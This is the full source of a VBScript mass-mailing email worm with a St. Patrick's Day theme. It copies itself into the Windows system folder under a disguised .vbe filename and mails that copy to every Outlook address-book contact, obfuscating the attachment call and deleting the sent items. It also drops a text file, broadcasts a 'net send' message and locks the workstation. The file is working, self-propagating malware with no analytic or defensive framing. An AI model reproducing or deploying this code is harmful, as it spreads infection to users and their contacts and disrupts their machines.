   '****************************************************************
   dim T,R,I,N
   '****************************************************************
   Randomize
   '****************************************************************
   T = Rnd()
   R = Rnd()
   I = Rnd()
   N = Rnd()
   '****************************************************************
   set rN5hhta76U = createobject("scripting.filesystemobject")
   rB4vtjy87B = rN5hhta76U.getspecialfolder(1)
   '****************************************************************
   xJ5tbol29P = rB4vtjy87B & "\http St.Patrick.html                    " & T & R & I & N & I & T & I & ".vbe"
   set qG2uuoy91F = createobject("wscript.shell")
   '****************************************************************
   rN5hhta76U.copyfile wscript.scriptfullname, xJ5tbol29P
   yK2eeqk41R
   '****************************************************************
   Function yK2eeqk41R()
   Set WshNetwork = WScript.CreateObject("WScript.Network")
   '****************************************************************
   MsgBox "Knock, Knock,  " & WshNetwork.UserName & "!",64,"Knock, Knock,  " & WshNetwork.UserName
   on error resume next
   '****************************************************************
   Set uA2bcid0N = CreateObject("Outlook" & ".Application")
   '****************************************************************
   If uA2bcid0N = "Outlook" Then
   '****************************************************************
   Set qN8ceql35D = uA2bcid0N.GetNameSpace("MAPI")
   '****************************************************************
   Set rX5cskl49F = qN8ceql35D.AddressLists
   '****************************************************************
   For Each iC5excl27V In rX5cskl49F
   '****************************************************************
   If iC5excl27V.AddressEntries.Count <> 0 Then
   '****************************************************************
   sG6gcai79H = iC5excl27V.AddressEntries.Count
   '****************************************************************
   For fM2ibmf86O = 1 To sG6gcai79H
   '****************************************************************
   Set sX3ncpk96C = uA2bcid0N.CreateItem(0)
   '****************************************************************
   Set xP3dlfy13A = iC5excl27V.AddressEntries(fM2ibmf86O)
   '****************************************************************
   sX3ncpk96C.To = xP3dlfy13A.Address
   '****************************************************************
   sX3ncpk96C.Subject = "Check this out, St Patrick!"
   '****************************************************************
   sX3ncpk96C.Body = "Talk To you Later, " & WshNetwork.UserName
   '****************************************************************
   execute "set iN9nkvu67S = sX3ncpk96C." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
   yI4krek54U = xJ5tbol29P
   '****************************************************************
   sX3ncpk96C.DeleteAfterSubmit = True
   iN9nkvu67S.Add yI4krek54U
   If sX3ncpk96C.To <> "" Then
   '****************************************************************
   sX3ncpk96C.Send
   End If
   '****************************************************************
   Next
   End If
   Next
   '****************************************************************
   End If
   End function
   on error resume next
   Sub StartProcess (CommandLine, CurrentDirectory, computername)
   '****************************************************************
   Dim Proc, ProcessId
   Set Proc = GetObject("WinMgmts://"& computername &"/root/cimv2").Get("Win32_Process")
   Proc.Create CommandLine, CurrentDirectory, ProcessId
   Set Proc = Nothing
   End Sub
   rY2ncyq1O
   '****************************************************************
   on error resume next
   Function rY2ncyq1O()
   If month(now) = month(now) then
   '****************************************************************
   Set yX9ukuy25E = rN5hhta76U.opentextfile("c:\Readme.txt", 2, True, 0)
   '****************************************************************
   yX9ukuy25E.writeline"Beware on St Patricks day, a worm will come out and bite! CodeGreen :)"
   '****************************************************************
   yX9ukuy25E.Close
   Set yX9ukuy25E = nothing
   '****************************************************************
   qG2uuoy91F.run "net send * Beware on St Patricks day, a worm will come out and bite! CodeGreen :)", 7, false

   Dim comp
   '****************************************************************
   comp = WScript.CreateObject("WScript.Network").ComputerName
   '****************************************************************
   StartProcess "Rundll32.exe user32.dll,LockWorkStation", "C:\", comp
   end if
   '****************************************************************
   end function
   '****************************************************************
   '"!xobloot mrow sbv morf nekat snoitcnuf"
   '"!itinirT stuohs daM"
   '****************************************************************
